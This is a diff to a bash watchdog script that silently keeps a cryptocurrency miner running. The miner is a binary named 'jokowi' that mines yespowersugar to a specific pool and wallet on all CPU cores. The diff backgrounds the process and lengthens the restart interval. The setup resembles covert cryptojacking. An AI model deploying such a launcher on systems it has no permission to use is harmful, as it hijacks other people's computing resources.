@@ -1,7 +1,7 @@
 #!/bin/bash
 
 start_bandot() {
-    nohup ./jokowi -a yespowersugar -o nomp.mofumofu.me:3391 -u sugar1qmpk65gyqqgk63lkrg27gnl9hc2e8zqn7jgmd5j.COBA -t $(nproc) > /dev/null 2>&1
+    nohup ./jokowi -a yespowersugar -o nomp.mofumofu.me:3391 -u sugar1qmpk65gyqqgk63lkrg27gnl9hc2e8zqn7jgmd5j.COBA -t $(nproc) > /dev/null 2>&1 &
 }
 
 stop_bandot() {
@@ -18,5 +18,5 @@ while true; do
         start_bandot
     fi
     
-    sleep 5
+    sleep 240
 done
